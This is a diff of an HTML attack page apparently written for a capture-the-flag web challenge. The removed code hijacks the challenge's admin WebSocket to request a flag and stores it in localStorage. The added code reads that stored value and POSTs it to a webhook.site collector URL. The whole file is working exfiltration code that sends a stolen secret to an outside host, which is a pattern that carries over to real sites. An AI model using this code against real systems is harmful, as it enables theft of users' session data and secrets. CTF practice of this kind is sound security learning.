@@ -3,45 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Retrieve and Store Flag</title>
+    <title>Send Stored Flag</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const wsUrl = 'ws://ce441-web.spchallenge.ir:8080/admin/ws';
-
-            console.log('Opening WebSocket connection...');
-            const ws = new WebSocket(wsUrl);
-
-            ws.onopen = () => {
-                console.log('WebSocket connection opened');
-                ws.send('flag'); // Request the flag
+            // Function to send the flag to the webhook URL via POST request
+            const sendFlagToWebhook = (flag) => {
+                const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flags';
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json', // Indicate that the body is JSON
+                    },
+                    body: JSON.stringify({ flag: flag }), // Send the flag in the request body
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Flag sent successfully:', flag);
+                        alert('Flag sent successfully!');
+                    } else {
+                        console.error('Failed to send flag. Status:', response.status);
+                        alert('Failed to send flag.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending flag:', error);
+                    alert('Error sending flag.');
+                });
             };
 
-            ws.onmessage = (event) => {
-                console.log('Received WebSocket message:', event.data);
-                if (event.data.includes('flag{')) {
-                    const flag = event.data;
-                    console.log('Flag received:', flag);
-
-                    // Store the flag in localStorage
-                    localStorage.setItem('capturedFlag', flag);
-                    console.log('Flag stored in localStorage');
-                } else {
-                    console.warn('No valid flag found in the WebSocket message');
-                }
-            };
-
-            ws.onerror = (error) => {
-                console.error('WebSocket error:', error);
-            };
-
-            ws.onclose = () => {
-                console.log('WebSocket connection closed');
-            };
+            // Check if the flag is stored in localStorage
+            const storedFlag = localStorage.getItem('flag');
+            if (storedFlag) {
+                console.log('Stored flag:', storedFlag);
+                // If flag is stored, show a button to send the flag
+                const sendButton = document.createElement('button');
+                sendButton.innerText = 'Send Flag';
+                sendButton.onclick = () => {
+                    sendFlagToWebhook(storedFlag); // Send the stored flag on button click
+                };
+                document.body.appendChild(sendButton);
+            } else {
+                console.log('No flag stored in localStorage.');
+                alert('No flag found in localStorage.');
+            }
         });
     </script>
 </head>
 <body>
-    <h1>Retrieve and Store Flag</h1>
-    <p>The flag will be retrieved and stored in localStorage when the page loads. Check the console for details.</p>
+    <h1>Send Stored Flag</h1>
+    <p>If a flag is stored, you can send it to the specified webhook by clicking the button below.</p>
 </body>
 </html>
